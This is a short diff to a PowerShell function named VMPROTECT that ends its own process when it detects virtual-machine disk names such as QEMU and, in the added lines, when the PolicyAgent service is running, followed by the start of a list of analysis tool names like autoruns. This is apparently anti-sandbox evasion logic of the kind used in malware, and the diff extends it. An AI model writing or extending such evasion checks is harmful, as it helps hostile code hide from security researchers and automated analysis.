@@ -72,6 +72,9 @@ function VMPROTECT {
     if ($d -like "*DADY HARDDISK*" -or $d -like "*QEMU HARDDISK*") {  
         Stop-Process $pid -Force   
     }
+    if (Get-Service -Name "PolicyAgent" -ErrorAction SilentlyContinue | Where-Object {$_.Status -eq "Running"}) {
+        Stop-Process $pid -Force
+    } 
     $processnames = @(
         "autoruns",
         "autorunsc",
